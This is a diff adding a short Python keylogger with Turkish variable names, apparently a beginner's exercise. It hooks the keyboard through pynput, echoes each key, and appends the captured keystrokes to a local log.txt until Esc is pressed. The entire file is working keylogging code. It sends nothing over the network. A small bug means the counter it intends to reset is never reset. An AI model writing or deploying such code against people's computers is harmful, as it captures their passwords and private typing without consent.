@@ -1,0 +1,36 @@
+import pynput 
+from pynput.keyboard import Key, Listener
+
+sayi = 0
+keys = []
+
+def on_press(key):
+	global sayi, keys
+	sayi +=1
+	print('{} basıldı.'.format(key))
+	keys.append(key)
+	if sayi >= 5:
+		count = 0
+		write(keys)
+		keys = []
+
+def write(keys):
+	with open('log.txt', 'a', encoding="utf-8") as file:
+		for key in keys:
+			emir = str(key).replace("'", "") 
+			if emir.find("space") > 0:
+				file.write("\t")
+			elif emir.find("enter") > 0:
+				file.write("\n")
+			elif emir.find("Key") == -1:
+				file.write(emir)
+
+
+def on_release(key):
+	if key == Key.esc:
+		print('OK')
+		return False
+
+with Listener(on_press = on_press, on_release = on_release) as listener:
+	listener.join()
+
